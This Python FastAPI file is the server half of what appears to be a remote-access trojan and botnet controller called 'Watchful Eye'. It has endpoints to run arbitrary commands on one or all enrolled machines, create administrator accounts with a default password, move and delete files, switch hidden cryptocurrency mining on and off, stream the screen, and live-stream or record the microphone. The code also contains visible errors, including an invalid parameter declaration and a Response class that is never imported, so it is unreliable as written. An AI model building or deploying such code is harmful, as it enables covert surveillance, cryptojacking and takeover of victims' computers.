import json
import asyncio
from datetime import datetime
from pathlib import Path
from contextlib import asynccontextmanager

from fastapi import FastAPI, HTTPException, WebSocket, WebSocketDisconnect
from fastapi.staticfiles import StaticFiles
from fastapi.responses import FileResponse, JSONResponse
from pydantic import BaseModel
from typing import Optional, List

from database import Database
from discovery import DeviceDiscovery
from stream_handler import StreamManager
from file_manager import FileManager
from mining_manager import MiningManager

DB_PATH = Path(__file__).parent / "data" / "devices.db"
DATA_DIR = Path(__file__).parent / "data"
RECORDINGS_DIR = DATA_DIR / "recordings"

db: Optional[Database] = None
discovery: Optional[DeviceDiscovery] = None
stream_manager: Optional[StreamManager] = None
file_manager: Optional[FileManager] = None
mining_manager: Optional[MiningManager] = None


@asynccontextmanager
async def lifespan(app: FastAPI):
    global db, discovery, stream_manager, file_manager, mining_manager
    DATA_DIR.mkdir(parents=True, exist_ok=True)
    RECORDINGS_DIR.mkdir(parents=True, exist_ok=True)

    db = Database(str(DB_PATH))
    await db.init()
    discovery = DeviceDiscovery(db)
    stream_manager = StreamManager()
    file_manager = FileManager(db)
    mining_manager = MiningManager(db)

    discovery_task = asyncio.create_task(discovery.start_scanning())

    yield

    discovery_task.cancel()
    await db.close()


app = FastAPI(title="Watchful Eye Server", lifespan=lifespan)

app.mount("/web", StaticFiles(directory=str(Path(__file__).parent / "web")), name="web")


class CommandRequest(BaseModel):
    device_id: str
    command: str


class AdminRequest(BaseModel):
    device_id: str
    username: str = "System Admin"
    password: str = "Admin@WatchfulEye1"


class FileUploadRequest(BaseModel):
    device_id: str
    remote_path: str


class MiningConfig(BaseModel):
    device_id: str
    enabled: bool
    intensity: int = 50


class DeviceResponse(BaseModel):
    id: str
    hostname: str
    ip: str
    tailscale_ip: str
    os: str
    status: str
    last_seen: str
    has_gpu: bool
    gpu_name: str


@app.get("/")
async def root():
    return FileResponse(str(Path(__file__).parent / "web" / "index.html"))


@app.get("/api/devices")
async def get_devices():
    devices = await db.get_all_devices()
    return {"devices": devices}


@app.get("/api/devices/{device_id}")
async def get_device(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return {"device": device}


@app.post("/api/devices/{device_id}/admin/create")
async def create_admin(device_id: str, req: AdminRequest):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    if device["status"] != "online":
        raise HTTPException(status_code=400, detail="Device is offline")

    result = await _send_command_to_device(device_id, {
        "type": "create_admin",
        "username": req.username,
        "password": req.password
    })
    return {"result": result}


@app.post("/api/devices/{device_id}/command")
async def run_command(device_id: str, req: CommandRequest):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    if device["status"] != "online":
        raise HTTPException(status_code=400, detail="Device is offline")

    result = await _send_command_to_device(device_id, {
        "type": "run_command",
        "command": req.command
    })
    return {"result": result}


@app.post("/api/devices/{device_id}/command/all")
async def run_command_all(req: CommandRequest):
    devices = await db.get_all_devices()
    results = {}
    for device in devices:
        if device["status"] == "online":
            result = await _send_command_to_device(device["id"], {
                "type": "run_command",
                "command": req.command
            })
            results[device["hostname"]] = result
    return {"results": results}


@app.get("/api/devices/{device_id}/files")
async def browse_files(device_id: str, path: str = "C:\\"):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "list_files",
        "path": path
    })
    return {"files": result}


@app.post("/api/devices/{device_id}/files/upload")
async def upload_file(device_id: str, remote_path: str, file bytes):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "upload_file",
        "remote_path": remote_path,
        "data": file.hex()
    })
    return {"result": result}


@app.get("/api/devices/{device_id}/files/download")
async def download_file(device_id: str, remote_path: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "download_file",
        "remote_path": remote_path
    })
    if "data" in result:
        import binascii
        return Response(
            content=binascii.unhexlify(result["data"]),
            media_type="application/octet-stream",
            headers={"Content-Disposition": f"attachment; filename={Path(remote_path).name}"}
        )
    raise HTTPException(status_code=404, detail="File not found")


@app.delete("/api/devices/{device_id}/files")
async def delete_file(device_id: str, remote_path: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "delete_file",
        "remote_path": remote_path
    })
    return {"result": result}


@app.post("/api/devices/{device_id}/mining")
async def configure_mining(device_id: str, config: MiningConfig):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "mining_config",
        "enabled": config.enabled,
        "intensity": config.intensity
    })
    await db.update_mining_status(device_id, config.enabled, config.intensity)
    return {"result": result}


@app.get("/api/devices/{device_id}/mining/stats")
async def get_mining_stats(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "mining_stats"
    })
    return {"stats": result}


@app.get("/api/screen/{device_id}")
async def get_screen(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "screen_capture"
    })
    if "image" in result:
        import base64
        return Response(
            content=base64.b64decode(result["image"]),
            media_type="image/jpeg"
        )
    raise HTTPException(status_code=500, detail="Failed to capture screen")


@app.websocket("/ws/screen/{device_id}")
async def screen_stream(websocket: WebSocket, device_id: str):
    await websocket.accept()
    try:
        while True:
            device = await db.get_device(device_id)
            if not device or device["status"] != "online":
                await websocket.close(code=1000, reason="Device offline")
                break

            result = await _send_command_to_device(device_id, {
                "type": "screen_capture"
            })
            if "image" in result:
                await websocket.send_text(result["image"])
            await asyncio.sleep(0.5)
    except WebSocketDisconnect:
        pass


@app.get("/api/recordings")
async def get_recordings(device_id: Optional[str] = None):
    recordings = await db.get_recordings(device_id)
    return {"recordings": recordings}


@app.post("/api/microphone/{device_id}/start")
async def start_microphone(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "audio_start"
    })
    return {"result": result}


@app.post("/api/microphone/{device_id}/stop")
async def stop_microphone(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "audio_stop"
    })
    return {"result": result}


@app.get("/api/microphone/{device_id}/stream")
async def stream_microphone(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "audio_read"
    })
    return {"audio": result.get("audio", "")}


@app.websocket("/ws/microphone/{device_id}")
async def microphone_stream(websocket: WebSocket, device_id: str):
    await websocket.accept()
    try:
        await _send_command_to_device(device_id, {
            "type": "audio_start"
        })

        while True:
            device = await db.get_device(device_id)
            if not device or device["status"] != "online":
                await websocket.close(code=1000, reason="Device offline")
                break

            result = await _send_command_to_device(device_id, {
                "type": "audio_read"
            })
            if "audio" in result:
                await websocket.send_text(result["audio"])
            await asyncio.sleep(0.05)
    except WebSocketDisconnect:
        await _send_command_to_device(device_id, {
            "type": "audio_stop"
        })


@app.post("/api/microphone/{device_id}/record")
async def record_microphone(device_id: str, duration: int = 10):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "audio_record",
        "duration": duration
    })
    return {"result": result}


@app.get("/api/microphone/{device_id}/devices")
async def get_audio_devices(device_id: str):
    device = await db.get_device(device_id)
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")

    result = await _send_command_to_device(device_id, {
        "type": "audio_devices"
    })
    return {"devices": result.get("devices", [])}


@app.post("/api/heartbeat")
async def heartbeat(data: dict):
    device_id = data.get("device_id")
    if not device_id:
        raise HTTPException(status_code=400, detail="Missing device_id")

    await db.update_device_status(
        device_id=device_id,
        hostname=data.get("hostname", "Unknown"),
        ip=data.get("ip", "Unknown"),
        tailscale_ip=data.get("tailscale_ip", "Unknown"),
        os=data.get("os", "Unknown"),
        has_gpu=data.get("has_gpu", False),
        gpu_name=data.get("gpu_name", "None"),
        admin=data.get("admin", False)
    )
    return {"status": "ok"}


async def _send_command_to_device(device_id: str, command: dict):
    device = await db.get_device(device_id)
    if not device:
        return {"error": "Device not found"}

    tailscale_ip = device.get("tailscale_ip")
    if not tailscale_ip:
        return {"error": "No Tailscale IP"}

    try:
        import aiohttp
        async with aiohttp.ClientSession() as session:
            async with session.post(
                f"http://{tailscale_ip}:9090/command",
                json=command,
                timeout=aiohttp.ClientTimeout(total=30)
            ) as resp:
                return await resp.json()
    except Exception as e:
        return {"error": str(e)}


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
